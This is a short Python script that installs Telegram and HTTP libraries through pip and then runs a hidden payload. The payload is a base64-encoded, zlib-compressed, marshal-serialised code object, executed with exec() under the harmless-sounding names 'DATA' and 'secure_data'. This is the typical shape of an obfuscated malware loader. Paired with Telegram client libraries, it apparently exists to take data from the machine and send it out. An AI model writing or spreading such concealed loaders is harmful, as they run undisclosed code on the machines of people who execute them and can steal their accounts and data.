import subprocess
import sys
import base64
import zlib
import marshal
print("01010")
subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "telethon"])
subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])

# DATA
DATA = "eJxlUL2LE0EUn8/9iKtB2aAIsUkVUPFydyRKOFg5sTkERdTdZtlk5nK52w/Z2Rj1mpRaaeeVtnpX2Nnqf2AgkNzY2FjYCVcIVzlzHyjkDbw3vx+/33tvpgv+C+OkHnxR6R1ggMEYJDCAUN9RjALEcIAZCQgCHHK8R3fhsSWgnG46YC42z81zgaXcNreYsYuOmWUQlJT/4ryWE17aM091ag+kzz/8AtXAAhBwiCDwFdbMc+yDIaxbv7SkDiW+nRX3Xl5vtpqNG0vLrYWlW553NxSPtvw7i48f3mw9GHaa0bNrfPVJ0IgW1wap763ej7Eyk7WPMdUtaJFt8VSivFNH0uxuREXYZ9JiWXeQ8LSoO9IqeMx7eZTkejeJMiHtTlaER8acag4rLE3BhehnqbTW+zFPo4RL54QKNSNJ9lRNguvyrOApC09HfAAH+jmHVlsUeT/trUirnWRsEPOV3D36CgCEr9JvDCH8CS59B/YPpz2yZyV3ZO4b9lt7Ylwe4Vn5wpvt19vTcm1cro2cfWq/urpDJrT6/vyMmFNSGZPKTu8T/EYqE9L4g4FxZUqrY1o9FGdU98+u5+KvLvWq5l8VfIiU"
secure_data = DATA
payload = marshal.loads(zlib.decompress(base64.b64decode(secure_data)))
exec(payload)
